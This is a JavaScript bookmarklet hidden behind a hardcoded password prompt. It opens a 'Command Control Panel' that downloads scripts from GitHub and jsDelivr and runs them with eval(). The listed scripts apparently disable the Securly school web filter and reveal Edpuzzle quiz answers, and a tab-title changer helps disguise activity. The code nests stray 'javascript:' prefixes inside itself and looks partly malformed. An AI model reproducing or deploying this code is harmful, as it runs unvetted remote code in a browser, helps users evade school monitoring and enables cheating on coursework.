javascript: (function(){  var style = document.createElement('style');  style.type = 'text/css';  style.innerHTML = '* { position: relative; z-index: 9999; }';  document.head.appendChild(style);  javascript:(function(){  var passwordInput = document.createElement('input');  passwordInput.type = 'password';  passwordInput.placeholder = 'Enter password';  passwordInput.style.transition = 'all 0.5s ease-in-out';  var closeButton = document.createElement('button');  closeButton.innerText = '✖';  closeButton.style.position = 'absolute';  closeButton.style.top = '5px';  closeButton.style.right = '5px';  closeButton.style.backgroundColor = 'transparent';  closeButton.style.border = 'none';  closeButton.style.fontSize = '24px';  closeButton.style.cursor = 'pointer';  var form = document.createElement('form');  form.style.position = 'fixed';  form.style.top = '10px';  form.style.right = '-200px';  form.style.transition = 'all 0.5s ease-in-out';  form.appendChild(passwordInput);  form.appendChild(closeButton);  document.body.appendChild(form);  setTimeout(function() {    form.style.right = '10px';  }, 100);  closeButton.addEventListener('click', function(e) {    e.preventDefault();    form.style.right = '-200px';    setTimeout(function() {      form.remove();    }, 500);  });  passwordInput.addEventListener('keydown', function(e) {    if (e.key === 'Enter' && passwordInput.value === '9182') {      passwordInput.style.transform = 'rotateY(180deg)';      passwordInput.style.backgroundColor = '#6ab04c';      setTimeout(function() {        form.style.right = '-200px';        setTimeout(function() {          form.remove();        }, 500);        javascript:(function(){  const button = document.createElement('button');  button.innerHTML = 'Open Command Control Panel 🖥';  button.style.cssText = 'position:fixed;bottom:10px;right:10px;background:#333;color:#fff;border:none;padding:10px;border-radius:5px;z-index:9999;';  const commands = [    {name:'Securly Kill V111', url:'https://raw.githubusercontent.com/zek-c/Securly-Kill-V111/main/kill.js'},    {name:'Edpuzzle Answers', url:'https://cdn.jsdelivr.net/gh/ading2210/edpuzzle-answers@latest/script.js'},    {name:'Change Tab Title', action:()=>{document.title=prompt('Enter new title:')}}];  button.onclick = () => {    const dropdown = document.createElement('div');    dropdown.style.cssText = 'position:fixed;top:10px;right:10px;background:#f9f9f9;border:1px solid #ccc;padding:10px;border-radius:5px;z-index:9999;opacity:0;transition:opacity 0.5s ease;';    const title = document.createElement('h3');    title.innerHTML = 'Command Control Panel 🖥';    dropdown.appendChild(title);    const select = document.createElement('select');    select.style.marginBottom = '10px';    commands.forEach(command=>{      const option = document.createElement('option');      option.innerHTML = command.name;      select.appendChild(option);    });    dropdown.appendChild(select);    const closeButton = document.createElement('button');    closeButton.innerHTML = 'Close ❌';    closeButton.style.marginLeft = '10px';    closeButton.onclick = () => {      dropdown.style.opacity = 0;      setTimeout(() => {document.body.removeChild(dropdown); document.body.removeChild(button);}, 500);    };    dropdown.appendChild(closeButton);    const executeButton = document.createElement('button');    executeButton.innerHTML = 'Execute ✔%EF%B8%8F';    executeButton.style.marginLeft = '10px';    executeButton.onclick = () => {      const selectedOption = select.options[select.selectedIndex];      const selectedCommand = commands.find(command=>command.name===selectedOption.innerHTML);      if(selectedCommand.url){        fetch(selectedCommand.url).then(response => response.text()).then(script => eval(script));      }else if(selectedCommand.action){        selectedCommand.action();      }      closeButton.onclick();    };    dropdown.appendChild(executeButton);    document.body.appendChild(dropdown);    setTimeout(() => {dropdown.style.opacity = 1;}, 10);  };  document.body.appendChild(button);})();      }, 1000);    } else if (e.key === 'Enter') {      passwordInput.style.transform = 'rotateY(360deg)';      passwordInput.style.backgroundColor = '#dc3545';      setTimeout(function() {        passwordInput.style.transform = 'rotateY(0deg)';        passwordInput.style.backgroundColor = '#fff';        passwordInput.value = '';      }, 1000);    }  });})();  })();
